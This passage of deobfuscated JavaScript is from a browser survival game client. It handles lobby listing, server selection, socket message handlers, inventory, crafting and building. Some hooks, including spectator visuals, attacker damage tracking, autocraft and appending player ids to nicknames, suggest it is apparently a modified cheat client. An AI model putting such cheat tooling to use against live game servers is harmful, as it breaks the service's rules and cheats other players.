    o_.items.push(new cs(us.FRUIT, 0, 0, 0, 0, 0, 0, 5));
    o_.items.push(new cs(us.WORKBENCH, 0, 0, 0, 0, Math.PI / 4, 0, 0));
    o_.items.push(new cs(us.FRUIT, 0, 0, 0, 0, 0, 0, 5));
    client = new function () {
      var e = this;
      this.socket = null;
      this._current_id = 0;
      this.server_list = [];
      this.mode_list = [[], [], [], [], [], [], [], [], []];
      this.selected_server = [-1, -1, -1, -1, -1, -1, -1, -1, -1];
      this.current_mode = 0;
      this.privateServer = 0;
      this.get_rivet_token = async function () {
        if (o == n.DEV) {
          let e = await fetch(`${O_}rivet-token`);
          return await e.text();
        }
        return null;
      };
      this.fetch_server_list = async function () {
        let e = await this.get_rivet_token();
        let i = {};
        if (e) {
          i.Authorization = `Bearer ${e}`;
        }
        let t = await fetch(_s + "/lobbies/list", {
          method: "GET",
          headers: i
        });
        if (!t.ok) {
          console.error("Failed to list lobbies");
          throw "Failed to list lobbies";
        }
        let r = await t.json();
        console.log("Lobbies", r);
        this.server_list = [];
        let n = {};
        for (let e of r.game_modes) {
          this.server_list.push({
            a: "Auto Select",
            gm: e.game_mode_id,
            m: 100,
            nu: 0,
            auto: true
          });
        }
        for (let e of r.lobbies) {
          let i;
          let t = e.game_mode_id;
          i = t in n ? ++n[t] : n[t] = 1;
          let a = r.regions.find(i => i.region_id == e.region_id);
          this.server_list.push({
            a: a.region_display_name + " " + i,
            gm: e.game_mode_id,
            idx: i,
            m: e.max_players_normal,
            nu: e.total_player_count,
            id: e.lobby_id
          });
        }
      };
      this.geolocate_server = function (e) {
        for (var i = [], t = 0; t < e.length; t++) {
          if (e[t].a.indexOf(Ae) !== -1) {
            i.push(t);
          }
        }
        if (i.length === 0) {
          return 0;
        } else {
          return i[Math.floor(Math.random() * i.length)];
        }
      };
      this.set_server_list = function (e) {
        for (var i = 0, t = 0; t < e.length; t++) {
          i += e[t].nu;
        }
        var r = document.getElementById("servselect");
        if (client.selected_server[client.current_mode] === -1) {
          client.selected_server[client.current_mode] = r.selectedIndex = client.geolocate_server(e);
        } else {
          r.selectedIndex = client.selected_server[client.current_mode];
        }
        var n = "<label for=\"ul-id\"><button type=\"button\" class=\"ng-binding\">" + e[r.selectedIndex].a + (e[r.selectedIndex].nu > 0 ? " [" + e[r.selectedIndex].nu + " " + ve[TEXT.PLAYERS] + "]" : "") + "</button></label><ul role=\"listbox\" id=\"ul-id\" class=\"md-whiteframe-z1\" name=\"ul-id\"><li role=\"option\" id=\"selectDisabled\">" + ve[TEXT.CHOOSE] + " (" + this.total_players + ") " + ve[TEXT.TOTAL_PLAYERS] + "</li>";
        for (t = 0; t < e.length; t++) {
          n += "<li role=\"option\">" + e[t].a;
          n += " [" + e[t].nu + " " + ve[TEXT.PLAYERS] + "]";
          n += "</li>\n";
        }
        n += "<li role=\"option\" id=\"selectDisabled\">(" + i + ") " + ve[TEXT.TOTAL_MODE] + "</li>";
        n += "</div>";
        r.innerHTML = n;
        $(".md-select").on("click", function () {
          $(this).toggleClass("active");
        });
        $(".md-select ul li").on("click", function () {
          for (var e = $(this).text(), i = -1, t = client.mode_list[client.current_mode], r = 0; r < t.length; r++) {
            if (t[r].a + " [" + t[r].nu + " " + ve[TEXT.PLAYERS] + "]" === e) {
              i = r;
              break;
            }
          }
          if (i !== -1) {
            document.getElementById("servselect").selectedIndex = i;
            client.selected_server[client.current_mode] = i;
            $(".md-select ul li").removeClass("active");
            $(this).addClass("active");
            $(".md-select label button").text(e);
          }
        });
      };
      this.total_players = 0;
      this.update_server_list = function () {
        this.total_players = 0;
        for (var e = 0; e < client.server_list.length; e++) {
          if (this.server_list[e].gm == "experimental") {
            this.mode_list[ds.MODE_EXPERIMENTAL].push(this.server_list[e]);
          } else if (this.server_list[e].gm == "zombies") {
            this.mode_list[ds.MODE_ZOMBIES].push(this.server_list[e]);
          } else if (this.server_list[e].gm == "forest") {
            this.mode_list[ds.MODE_LEGACY].push(this.server_list[e]);
          } else if (this.server_list[e].gm == "battle-royale") {
            this.mode_list[ds.MODE_BR].push(this.server_list[e]);
          } else if (this.server_list[e].gm == "vampires") {
            this.mode_list[ds.MODE_VAMPIRES].push(this.server_list[e]);
          } else {
            this.mode_list[ds.MODE_PVP].push(this.server_list[e]);
          }
          this.total_players += this.server_list[e].nu;
        }
        for (e = 0; e < this.mode_list.length; e++) {
          if (this.mode_list[e].length === 0) {
            this.mode_list[e].push({
              a: ve[TEXT.COMMING_SOON],
              nu: 0,
              i: "127.0.0.1",
              p: 80
            });
          }
        }
        this.set_server_list(this.mode_list[0]);
        this.select_gamemode = function (e) {
          client.current_mode = e;
          client.set_server_list(client.mode_list[client.current_mode]);
          client.set_server_list(client.mode_list[client.current_mode]);
          document.getElementById("servselect").selectedIndex = client.current_mode;
        };
      };
      this.timeout_server = 0;
      this.timeout_number = 0;
      this.timeout_handler = null;
      this.timeout = function () {
        e.timeout_number++;
        e.socket.close();
        if (e.timeout_number > As.TIMEOUT_NUMBER) {
          n_.error_level = As.ERROR_REFUSED;
          e.new_alert(ve[TEXT.YOU_CANNOT_JOIN]);
          n_.waiting = false;
          if (__.reconnect.enabled) {
            T_.quit(n_.run);
          }
        } else {
          e.connect_timeout();
        }
      };
      this.kick = function (e) {
        if (this._current_id == this.socket._current_id) {
          this._current_id++;
          this.new_alert(ve[TEXT.KICKED] + e);
          T_.quit(n_.run);
        }
      };
      this.mute = function () {
        this.new_alert("You speak too much");
      };
      this.already_used_key = function () {
        clearTimeout(this.timeout_handler);
        this.new_alert(ve[TEXT.KEY_ALREADY]);
        n_.waiting = false;
      };
      this.hide_shop_kit = function () {
        __.shop.open = false;
      };
      this.hide_recipe_book = function () {
        T_.show_recipe_book = 0;
      };
      this.hide_clock = function () {
        T_.show_clock = 0;
      };
      this.sand_tempest = function (e) {
        __.desert.tempest = e;
        if (s_.dist_desert > -300) {
          if (e === 0) {
            this.new_alert(ve[TEXT.TEMPEST_OFF]);
          } else {
            this.new_alert(ve[TEXT.TEMPEST_ON]);
          }
        }
      };
      this.bandage = function (e) {
        __.bandage = e;
      };
      this.blizzard_status = function (e) {
        __.blizzard = e;
      };
      this.blizzard = function (e) {
        __.winter.tempest = e;
        if (s_.dist_winter > -300) {
          if (e === 0) {
            this.new_alert(ve[TEXT.BLIZZARD_OFF]);
          } else {
            this.new_alert(ve[TEXT.BLIZZARD_ON]);
          }
        }
      };
      this.explorer_quest = function (e) {
        if (e === 0) {
          document.getElementById("exploreForest").src = "img/forest-leaf-ok.png";
        } else if (e === 1) {
          document.getElementById("exploreWinter").src = "img/winter-flake-ok.png";
        } else if (e === 2) {
          document.getElementById("exploreLava").src = "img/lava-volcano-ok.png";
        } else if (e === 3) {
          document.getElementById("exploreDesert").src = "img/desert-cactus-ok.png";
        }
      };
      this.hide_market = function () {
        T_.show_market = 0;
      };
      this.hide_quest = function () {
        T_.show_quest = 0;
      };
      this.clean_inventory = function () {
        __.inv.can_select = [];
        __.inv.n = [];
        __.inv.id = -1;
        __.inv.drag.stop();
        __.craft.can_craft = [];
        __.craft.crafting = false;
        __.craft.can_build = false;
        __.craft.preview = -1;
        __.craft.id = -1;
        __.craft.workbench = false;
        __.craft.well = false;
        __.craft.fire = false;
        __.craft.water = false;
        __.craft.timeout = new Utils.LinearAnimation(false, 0, 1, 0, 1, 1);
      };
      this.wrong_key = function () {
        clearTimeout(this.timeout_handler);
        this.new_alert();
        n_.waiting = false;
      };
      this.commands = function (e) {
        for (var i = 0; i < e.length; i++) {
          if (typeof e[i] == "string") {
            e[i] = Utils.escape_html(e[i]);
          }
        }
        __.terminal.write_command(e[1], e[2], e[3], e[4]);
      };
      this.message = function (e) {
        this.new_alert(e);
      };
      this.wrong_password = function () {
        clearTimeout(this.timeout_handler);
        this.new_alert(ve[TEXT.WRONG_PASSWORD]);
        n_.waiting = false;
      };
      this.new_version = function () {
        clearTimeout(this.timeout_handler);
        this.new_alert(ve[TEXT.NEW_VERSION]);
        n_.waiting = false;
      };
      this.old_version = function () {
        clearTimeout(this.timeout_handler);
        this.new_alert(ve[TEXT.OLD_VERSION]);
        n_.waiting = false;
      };
      this.get_bag = function () {
        __.inv.update_bag_size(1, 0);
        T_.update_inv_buttons();
      };
      this.verified_account = function (e) {
        var i = e[1];
        var t = s_.players[i];
        t.skin = e[2];
        t.accessory = e[3];
        t.baglook = e[4];
        t.book = e[5];
        t.crate = e[6];
        t.dead = e[7];
        t.level = e[8];
        var r = s_.fast_units[i * s_.max_units];
        if (r) {
          r.skin = e[2];
          r.accessory = e[3];
          r.baglook = e[4];
          r.book = e[5];
        }
      };
      this.build_stop = function (e) {
        if (e === le.BAG) {
          __.inv.update_bag_size(1, 0);
          T_.update_inv_buttons();
        } else {
          this.gather([0, e, 1]);
        }
        __.craft.restart();
      };
      this.recycle_ok = function (e) {
        __.auto_feed.delay = 0;
        __.craft.do_recycle(e);
      };
      this.recycle_stop = function (e) {
        for (var i = ge[e].r, t = 0; t < i.length; t++) {
          if (__.inv.max > __.inv.can_select.length || __.inv.n[i[t][0]] > 0) {
            var r = Math.floor(i[t][1] * 0.8);
            if (!r) {
              continue;
            }
            this.gather([0, i[t][0], r]);
          }
        }
        __.craft.restart();
      };
      this.build_ok = function (e) {
        __.auto_feed.delay = 0;
        __.craft.do_craft(e);
      };
      this.new_alert = function (e) {
        if (__.alert.text) {
          if (e !== __.alert.text && e !== __.alert.list[__.alert.list.length - 1]) {
            __.alert.list.push(e);
          }
        } else {
          __.alert.text = e;
        }
      };
      this.no_resources = function () {
        this.new_alert(ve[TEXT.NO_MORE_RESOURCES]);
      };
      this.survive = function () {
        var e;
        e = __.day == 0 ? ve[TEXT.SURVIVED_1DAY] : ve[TEXT.SURVIVED] + (__.day + 1) + ve[TEXT.DAYS];
        this.new_alert(e);
        __.day++;
      };
      this.fail_restore = function () {
        clearTimeout(e.timeout_handler);
        __.reconnect.enabled = false;
        __.alive = false;
        this.new_alert(ve[TEXT.DEAD_SAD]);
        T_.quit(n_.run);
        this.socket.close();
      };
      this.blocked = function () {
        clearTimeout(this.timeout_handler);
        this.new_alert(ve[TEXT.SPAM_ME]);
        n_.waiting = false;
      };
      this.full = function () {
        clearTimeout(this.timeout_handler);
        this.new_alert(ve[TEXT.SPAM_ME2]);
        n_.waiting = false;
      };
      this.new_player = function (e) {
        var i = e[1];
        var t = s_.players;
        t[i].nickname = e[2];
        t[i].skin = e[3];
        t[i].accessory = e[4];
        t[i].baglook = e[5];
        t[i].book = e[6];
        t[i].crate = e[7];
        t[i].dead = e[8];
        t[i].level = e[9];
        t[i].score = 0;
        t[i].ldb_label = null;
        t[i].label = null;
        t[i].label_winter = null;
        t[i].alive = true;
        if (!(r.visuals.info.joindeath.join.length < 5)) {
          r.visuals.info.joindeath.join.shift();
        }
        r.visuals.info.joindeath.join.push(t[i]);
        if (os === 1) {
          t[i].nickname += "|" + i;
        }
      };
      this.get_focus = function () {
        if (!r.visuals.spectator.enable) {
          this.socket[as](B[W].stringify([11]));
        }
      };
      this.empty_res = function () {
        this.new_alert(ve[TEXT.EMPTY]);
      };
      this.inv_full = function () {
        this.new_alert(ve[TEXT.INV_FULL]);
      };
      this.choose_kit = function (e) {
        this.socket[as](k[O].stringify([21, e]));
        __.shop.open = false;
      };
      this.kit_ok = function (e) {
        for (var i = Ts[e - 1].items, t = 0; t < i.length && __.inv.max > __.inv.can_select.length; t++) {
          var r = i[t][1];
          var n = i[t][0];
          if (i[t][1] === le.BAG) {
            __.inv.update_bag_size(1, 0);
          } else {
            this.gather([0, r, n]);
          }
        }
      };
      this.gather = function (e) {
        for (var i = e.length, t = __.inv, r = 1; r < i; r += 2) {
          for (var n = e[r], a = e[r + 1], o = 0; o < t.can_select.length; o++) {
            if (t.can_select[o].id == n) {
              t.n[n] += a;
              break;
            }
          }
          if (o == t.can_select.length) {
            t.n[n] = a;
            t.can_select.push(T_.inv_buttons[n]);
            T_.update_inv_buttons();
          }
        }
        __.craft.update();
      };
      this.gauges = function (e, i, t, n, a, o, s) {
        if (Math.floor(11 - (Date.now() - r.visuals.gauges.healtimer) / 1000) < 5 || e / 100 > __.gauges.l) {
          r.visuals.gauges.healtimer = Date.now();
        }
        r.visuals.gauges.timer = Date.now();
        __.gauges.l = e / 100;
        __.gauges.h = i / 100;
        __.gauges.c = t / 100;
        __.gauges.t = n / 100;
        __.gauges.o = a / 100;
        __.gauges.wa = o / 100;
        __.bandage = s;
      };
      this.succeed_quest = function (e) {
        T_.quests.modify(e, 2);
      };
      this.fail_quest = function (e) {
        T_.quests.modify(e, 0);
      };
      this.claimed = function (e) {
        T_.quests.modify(e, 3);
      };
      this.gauges_life = function (e, i) {
        __.gauges.l = e / 100;
        __.bandage = i;
      };
      this.gauges_water = function (e) {
        __.gauges.t = e / 100;
      };
      this.gauges_food = function (e) {
        __.gauges.h = e / 100;
      };
      this.gauges_warm = function (e) {
        __.gauges.wa = e / 100;
      };
      this.gauges_cold = function (e) {
        __.gauges.c = e / 100;
      };
      this.get_time = function (e) {
        s_.time = e;
        s_.transition = true;
        A_.transition = 1;
      };
      this.change_ground = function () {
        document.getElementById("game_body").style.backgroundColor = Ie.GROUND[s_.time];
      };
      this.kill_player = function (e) {
        if (!(r.visuals.info.joindeath.dead.length < 5)) {
          r.visuals.info.joindeath.dead.shift();
        }
        r.visuals.info.joindeath.dead.push(s_.players[e]);
        if (s_.mode == ds.MODE_HUNGER_GAMES && s_.players[e].nickname !== "spectator") {
          this.new_alert(s_.players[e].nickname + ve[TEXT.DEAD]);
        }
        s_.players[e].alive = false;
      };
      this.set_cam = function (e) {
        if (!r.visuals.spectator.enable) {
          var i = new Uint16Array(e);
          player.cam.change(i[1], i[2]);
        }
      };
      this.recover_focus = function (e) {
        var i = new Uint16Array(e);
        __.cam.change(i[1], i[2]);
      };
      this.hitten_other = function (e, i) {
        for (var t = new Uint16Array(i), r = (e.length - 2) / 4, n = 0; n < r; n++) {
          var a = t[1 + n * 2];
          var o = e[4 + n * 4];
          var s = (e[5 + n * 4] >> 1) / 127 * Math.PI * 2;
          var _ = s_.fast_units[o * s_.max_units + a];
          if (_ && _.hit) {
            if (A_.loaded && A_.run) {
              A_.hit(e[5 + n * 4] & 1, SOUND_BUILD[_.type], _.x, _.y);
            }
            _.hit.angle = s;
            _.hit.update = s;
          }
        }
      };
      this.hitten = function (e) {
        for (var i = new Uint16Array(e), t = (i.length - 1) / 4, r = 0; r < t; r++) {
          var n;
          var a = r * 4;
          var o = i[1 + a];
          var s = i[2 + a];
          var _ = (i[3 + a] >> 1) / 127 * Math.PI * 2;
          var E = i[4 + a];
          var T = a_.tiles[s][o];
          switch (E) {
            case 0:
              (n = T.p[0][0]).angle = _;
              n.update = true;
              break;
            case 1:
              (n = T.s[0][0]).angle = _;
              n.update = true;
              break;
            case 2:
              (n = T.s[1][0]).angle = _;
              n.update = true;
              break;
            case 3:
              (n = T.s[2][0]).angle = _;
              n.update = true;
              break;
            case 4:
              (n = T.t[0][0]).angle = _;
              n.update = true;
              break;
            case 5:
              (n = T.t[1][0]).angle = _;
              n.update = true;
              break;
            case 6:
              (n = T.t[2][0]).angle = _;
              n.update = true;
              break;
            case 7:
              (n = T.t[3][0]).angle = _;
              n.update = true;
              break;
            case 8:
              (n = T.t[4][0]).angle = _;
              n.update = true;
              break;
            case 9:
              (n = T.t[5][0]).angle = _;
              n.update = true;
              break;
            case 10:
              (n = T.g[0][0]).angle = _;
              n.update = true;
              break;
            case 11:
              (n = T.g[1][0]).angle = _;
              n.update = true;
              break;
            case 12:
              (n = T.g[2][0]).angle = _;
              n.update = true;
              break;
            case 13:
              (n = T.d[0][0]).angle = _;
              n.update = true;
              break;
            case 14:
              (n = T.d[1][0]).angle = _;
              n.update = true;
              break;
            case 15:
              (n = T.d[2][0]).angle = _;
              n.update = true;
              break;
            case 16:
              (n = T.b[0][0]).angle = _;
              n.update = true;
              break;
            case 17:
              (n = T.b[1][0]).angle = _;
              n.update = true;
              break;
            case 18:
              (n = T.b[2][0]).angle = _;
              n.update = true;
              break;
            case 19:
              (n = T.b[3][0]).angle = _;
              n.update = true;
              break;
            case 20:
              (n = T.f[0][0]).angle = _;
              n.update = true;
              break;
            case 21:
              (n = T.f[1][0]).angle = _;
              n.update = true;
              break;
            case 22:
              (n = T.f[2][0]).angle = _;
              n.update = true;
              break;
            case 23:
              (n = T.sw[0][0]).angle = _;
              n.update = true;
              break;
            case 24:
              (n = T.sw[1][0]).angle = _;
              n.update = true;
              break;
            case 25:
              (n = T.sw[2][0]).angle = _;
              n.update = true;
              break;
            case 26:
              (n = T.gw[0][0]).angle = _;
              n.update = true;
              break;
            case 27:
              (n = T.gw[1][0]).angle = _;
              n.update = true;
              break;
            case 28:
              (n = T.gw[2][0]).angle = _;
              n.update = true;
              break;
            case 29:
              (n = T.dw[0][0]).angle = _;
              n.update = true;
              break;
            case 30:
              (n = T.dw[1][0]).angle = _;
              n.update = true;
              break;
            case 31:
              (n = T.dw[2][0]).angle = _;
              n.update = true;
              break;
            case 32:
              (n = T.a[0][0]).angle = _;
              n.update = true;
              break;
            case 33:
              (n = T.a[1][0]).angle = _;
              n.update = true;
              break;
            case 34:
              (n = T.a[2][0]).angle = _;
              n.update = true;
              break;
            case 35:
              (n = T.cs[0][0]).angle = _;
              n.update = true;
              break;
            case 36:
              (n = T.cs[1][0]).angle = _;
              n.update = true;
              break;
            case 37:
              (n = T.cs[2][0]).angle = _;
              n.update = true;
              break;
            case 38:
              (n = T.cs[3][0]).angle = _;
              n.update = true;
              break;
            case 40:
              (n = T.plm[0][0]).angle = _;
              n.update = true;
              break;
            case 41:
              (n = T.plm[1][0]).angle = _;
              n.update = true;
              break;
            case 42:
              (n = T.plm[2][0]).angle = _;
              n.update = true;
              break;
            case 50:
              (n = T.re[0][0]).angle = _;
              n.update = true;
              break;
            case 51:
              (n = T.re[1][0]).angle = _;
              n.update = true;
              break;
            case 52:
              (n = T.re[2][0]).angle = _;
              n.update = true;
              break;
            case 55:
              (n = T.c[0][0]).angle = _;
              n.update = true;
              break;
            case 56:
              (n = T.m[0][0]).angle = _;
              n.update = true;
              break;
            case 57:
              (n = T.m[1][0]).angle = _;
              n.update = true;
              break;
            case 58:
              (n = T.m[2][0]).angle = _;
              n.update = true;
          }
          if (A_.loaded && A_.run && n) {
            A_.hit(i[3 + a] & 1, SOUND_NATURE[E], n.x, n.y);
          }
        }
      };
      this.resurrection = function () {
        this.socket[as](K[T].stringify([17, __.resurrection.pid, __.resurrection.iid]));
      };
      this.give_wheat = function (e, i) {
        this.socket[as](K[d].stringify([22, i, e.pid, e.iid]));
      };
      this.give_bread_oven = function (e, i, t) {
        if (i) {
          this.socket[as](K[d].stringify([25, i, e.pid, e.iid]));
        } else {
          this.socket[as](K[A].stringify([24, t, e.pid, e.iid]));
        }
      };
      this.take_bread = function (e) {
        this.socket[as](J[I].stringify([26, e.pid, e.iid]));
      };
      this.claim_quest_reward = function (e) {
        this.socket[as](J[R].stringify([27, e]));
      };
      this.give_well = function (e) {
        this.socket[as](F[T].stringify([30, e.pid, e.iid]));
      };
      this.give_wood_extractor = function (e, i) {
        this.socket[as](k[I].stringify([38, i, e.pid, e.iid, e.type]));
      };
      this.give_wood = function (e, i) {
        this.socket[as](k[I].stringify([12, i, e.pid, e.iid]));
      };
      this.give_item = function (e, i, t) {
        this.socket[as](F[d].stringify([8, i, t, e.pid, e.iid]));
      };
      this.take_extractor = function (e) {
        this.socket[as](J[I].stringify([37, e.pid, e.iid, e.type]));
      };
      this.take_flour = function (e) {
        this.socket[as](J[I].stringify([23, e.pid, e.iid]));
      };
      this.take_chest = function (e) {
        this.socket[as](J[I].stringify([9, e.pid, e.iid]));
      };
      this.unlock_chest = function (e) {
        this.socket[as](X[u].stringify([15, e.pid, e.iid]));
      };
      this.lock_chest = function (e) {
        this.socket[as](q[O].stringify([16, e.iid]));
      };
      this.kick_team = function (i) {
        e.socket[as](Z[R].stringify([20, __.totem.id, __.team[i]]));
      };
      this.join_team = function () {
        e.socket[as](Q[g].stringify([18, __.totem.pid, __.totem.id]));
      };
      this.leave_team = function () {
        e.socket[as](ee[C].stringify([19]));
      };
      this.lock_team = function () {
        e.socket[as](ee[R].stringify([35, __.totem.id]));
        if (document.getElementById("lock_team").innerHTML == "LOCK") {
          __.totem.lock = 1;
          document.getElementById("lock_team").innerHTML = "UNLOCK";
        } else {
          __.totem.lock = 0;
          document.getElementById("lock_team").innerHTML = "LOCK";
        }
      };
      this.units = function (e, i, r) {
        var n = new Uint16Array(e);
        if (r) {
          s_.delete_all_units();
        }
        for (var a = (i.length - 2) / 18, o = 0; o < a; o++) {
          var s = 2 + o * 18;
          var _ = 1 + o * 9;
          var E = i[s];
          var T = n[_ + 1];
          var A = n[_ + 5];
          var d = E * s_.max_units + A;
          if (T & Es.DELETE) {
            s_.delete_units(d);
          } else {
            var h = n[_ + 2];
            var I = n[_ + 3];
            var u = n[_ + 4];
            var l = n[_ + 6];
            var O = n[_ + 7];
            var c = n[_ + 8];
            var R = i[s + 1] / 255 * Math.PI * 2;
            if (s_.fast_units[d]) {
              var g = s_.fast_units[d];
              g.r.x = I;
              g.r.y = u;
              if (E != 0 && Utils.dist(g, g.r) > As.LAG_DISTANCE) {
                g.x = I;
                g.y = u;
              }
              if (!(g.id === __.id && E !== 0)) {
                g.nangle = R;
              }
              g.action |= T;
              g.info = l;
              g.speed = O;
              g.extra = c;
              if (g.update) {
                g.update(T);
              }
              if (T === Es.HURT) {
                t.getAttackers(g, s_.units[us.PLAYERS]).forEach(e => {
                  g.damaged += t.getDamage(e.right);
                  g.hited++;
                });
              }
            } else {
              var C = new cs(h, E, A, I, u, R, T, l, O, c);
              s_.fast_units[d] = C;
              s_.units[h].push(C);
            }
          }
        }
      };
      this.leaderboard = function (e) {
        this.timeout_server = u_;
        var i = new Uint16Array(e);
        __.ldb.init(i);
      };
      this.new_recipes = function (e) {
        if (Re !== undefined) {
          ge = Re;
        }
        if (e.length > 0) {
          Re = JSON.parse(JSON.stringify(ge));
          for (var i = 0; i < e.length; i++) {
            var t = e[i];
            var r = ge[t.item];
            if (r !== undefined) {
              r.r = t.recipe;
              r.w = t.workbench;
              r.f = t.fire;
              r.o = t.water;
              r.e = t.well;
              r.time = 1 / t.time;
            }
          }
        }
      };
      this.welcome = function (e) {
        if (e && e.length !== 0) {
          __.welcome.message = function (e) {
            var i = document.createElement("canvas");
            var t = i.getContext("2d");
            for (t.lineJoin = "round"; e.indexOf("\\n") !== -1;) {
              e = e.replace("\\n", "\n");
            }
            e = e.split("\n");
            color = [];
            var r = e.length * 18 + 10;
            var n = 0;
            t.font = "14px Baloo Paaji";
            for (var a = 0; a < e.length; a++) {
              if (e[a].charAt(0) === "#") {
                color[a] = e[a].substring(0, 7);
                e[a] = e[a].substring(8);
              } else {
                color[a] = "#FFFFFF";
              }
              n = Math.max(t.measureText(e[a]).width + 16, n);
            }
            i.height = r;
            i.width = n;
            a = 0;
            for (; a < e.length; a++) {
              var o = Zi(1, e[a], 14, color[a], null, null, null, null, null, "#000", 6);
              t.drawImage(o, 8, a * 18 + 5);
            }
            return i;
          }(e);
        } else {
          __.welcome.message = undefined;
        }
      };
      this.chat = function (e) {
        var i = s_.fast_units[e[1] * s_.max_units];
        if (i) {
          if (s_.mode === ds.MODE_ZOMBIES && i.skin === ds.ZOMBIE_SKIN) {
            if (__.zombie) {
              if (Math.random() > 0.5) {
                i.text.push(e[2] + " ..." + ZOMBIE_GRUMBLE);
              } else {
                i.text.push(ZOMBIE_GRUMBLE + "... " + e[2]);
              }
            } else {
              i.text.push(ZOMBIE_GRUMBLES[Math.floor(Math.random() * ZOMBIE_GRUMBLES.length)]);
            }
          } else {
            i.text.push(e[2]);
          }
        }
      };
      this.select_craft = function (e) {
        if (__.inv.max !== __.inv.can_select.length || ge[e].id2 === le.BAG || __.inv.find_item(ge[e].id2) != -1 || __.inv.free_place(ge[e].r)) {
          r.main.processing.autocraft.id = e;
          this.socket[as](B[W].stringify([5, le.BOOK]));
          this.socket[as](B[W].stringify([7, e]));
          return 1;
        } else {
          this.inv_full();
          return 0;
        }
      };
      this.workbench = function (e) {
        __.craft.set_workbench(e);
      };
      this.well = function (e) {
        __.craft.well = e;
        __.craft.update();
      };
      this.fire = function (e) {
        __.craft.fire = e;
        __.craft.update();
      };
      this.water = function (e) {
        __.craft.water = e;
        __.craft.update();
      };
      this.dont_harvest = function (e) {
        this.new_alert(ve[TEXT.WRONG_TOOL]);
      };
      this.cancel_craft = function () {
        __.craft.restart();
      };
      this.minimap = function (e) {
        T_.minimap.players = [];
        for (var i = s_.fast_units[__.uid], t = 0, r = 1; r < e.length; r += 2) {
          var n = {
            x: Math.floor(e[r] * s_.w / 250),
            y: Math.floor(e[r + 1] * s_.h / 250)
          };
          if (i && !t && !__.spectator && Utils.dist(n, i) < 250) {
            t += 1;
          } else {
            T_.minimap.players.push(n);
          }
        }
      };
      this.reborn = function () {
        __.resurrection.open = false;
        __.ghost.enabled = false;
        __.ghost.delay = -1;
        __.ghost.label = null;
        __.ghost.sec = null;
        __.ghost.now = -1;
      };
      this.ghost = function (e) {
        ds.GHOST_DELAY = e;
        __.ghost.enabled = true;
        __.ghost.delay = new Date().getTime();
        __.ghost.label = null;
        __.ghost.now = -1;
        for (var i = [le.SUPER_HAMMER, le.DRAGON_HEART, le.SWORD_WOOD, le.SWORD, le.SWORD_GOLD, le.SWORD_DIAMOND, le.SWORD_AMETHYST, le.REIDITE_SWORD, le.DRAGON_SWORD, le.LAVA_SWORD, le.PIRATE_SWORD, le.SPEAR, le.WOOD_SPEAR, le.GOLD_SPEAR, le.DIAMOND_SPEAR, le.AMETHYST_SPEAR, le.REIDITE_SPEAR, le.DRAGON_SPEAR, le.LAVA_SPEAR, le.CRAB_SPEAR, le.WOOD_BOW, le.STONE_BOW, le.GOLD_BOW, le.DIAMOND_BOW, le.AMETHYST_BOW, le.REIDITE_BOW, le.DRAGON_BOW, le.WOOD_SHIELD, le.STONE_SHIELD, le.GOLD_SHIELD, le.DIAMOND_SHIELD, le.AMETHYST_SHIELD, le.REIDITE_SHIELD, le.WAND1, le.WAND2, le.PICK_WOOD, le.PICK, le.PICK_GOLD, le.PICK_DIAMOND, le.PICK_AMETHYST, le.PICK_REIDITE, le.SPANNER, le.PITCHFORK, le.PITCHFORK2], t = 0; t < i.length; t++) {
          var r = __.inv.find_item(i[t]);
          if (r != -1) {
            __.inv.delete_item(i.length[t], r);
          }
        }
        __.craft.restart();
      };
      this.decrease_item2 = function (e, i, t) {
        this.decrease_item(e, i * 256 + t);
      };
      this.decrease_item = function (e, i) {
        __.craft.preview = -1;
        __.inv.decrease(e, i, __.inv.find_item(e));
        __.craft.update();
      };
      this.accept_build = function (e) {
        __.craft.preview = -1;
        __.build.wait = true;
        var i = __.inv.find_item(e);
        __.inv.decrease(e, 1, i);
        if (i >= 0 && !__.inv.n[e]) {
          __.craft.update();
        }
        if (e == le.TOTEM) {
          __.team = [__.id];
        }
      };
      this.cancel_crafting = function () {
        this.socket[as](K[T].stringify([31]));
      };
      this.buy_market = function (e) {
        this.socket[as](k[A].stringify([32, e.val, e.id]));
      };
      this.update_sign = function (e, i) {
        this.socket[as](k[I].stringify([33, e, i]));
      };
      this.send_build = function () {
        var e = s_.fast_units[__.uid];
        if (e) {
          var i = Math.PI * 2;
          this.socket[as](k[A].stringify([10, __.craft.preview, Math.floor((e.angle + i) % i * 255 / i), __.craft.mode]));
        }
      };
      this.select_inv = function (e, i) {
        switch (e) {
          case le.BANDAGE:
          case le.PLANT:
          case le.MEAT:
          case le.COOKED_MEAT:
          case le.SANDWICH:
          case le.BOTTLE_FULL:
          case le.COOKIE:
          case le.CAKE:
          case le.ICE:
          case le.BREAD:
          case le.PUMPKIN:
          case le.TOMATO:
          case le.CACTUS:
          case le.CARROT:
          case le.WATERMELON:
          case le.ALOE_VERA:
          case le.GARLIC:
          case le.FOODFISH:
          case le.FOODFISH_COOKED:
          case le.CRAB_STICK:
          case le.CRAB_LOOT:
          case le.CANDY:
          case le.SUGAR_CAN:
            __.craft.preview = -1;
            this.socket[as](F[d].stringify([5, e]));
            break;
          case le.WORKBENCH:
          case le.SPIKE:
          case le.SEED:
          case le.WHEAT_SEED:
          case le.PUMPKIN_SEED:
          case le.TOMATO_SEED:
          case le.CARROT_SEED:
          case le.GARLIC_SEED:
          case le.THORNBUSH_SEED:
          case le.WATERMELON_SEED:
          case le.ALOE_VERA_SEED:
          case le.FIRE:
          case le.WALL:
          case le.STONE_WALL:
          case le.GOLD_WALL:
          case le.DIAMOND_WALL:
          case le.BIG_FIRE:
          case le.CHEST:
          case le.RESURRECTION:
          case le.EMERALD_MACHINE:
          case le.WOOD_DOOR:
          case le.STONE_DOOR:
          case le.GOLD_DOOR:
          case le.DIAMOND_DOOR:
          case le.AMETHYST_DOOR:
          case le.REIDITE_DOOR:
          case le.WOOD_DOOR_SPIKE:
          case le.STONE_DOOR_SPIKE:
          case le.GOLD_DOOR_SPIKE:
          case le.DIAMOND_DOOR_SPIKE:
          case le.AMETHYST_DOOR_SPIKE:
          case le.REIDITE_DOOR_SPIKE:
          case le.STONE_SPIKE:
          case le.GOLD_SPIKE:
          case le.DIAMOND_SPIKE:
          case le.FURNACE:
          case le.AMETHYST_WALL:
          case le.AMETHYST_SPIKE:
          case le.REIDITE_WALL:
          case le.REIDITE_SPIKE:
          case le.BRIDGE:
          case le.ROOF:
          case le.PLOT:
          case le.WINDMILL:
          case le.EXTRACTOR_MACHINE_STONE:
          case le.EXTRACTOR_MACHINE_GOLD:
          case le.EXTRACTOR_MACHINE_DIAMOND:
          case le.EXTRACTOR_MACHINE_AMETHYST:
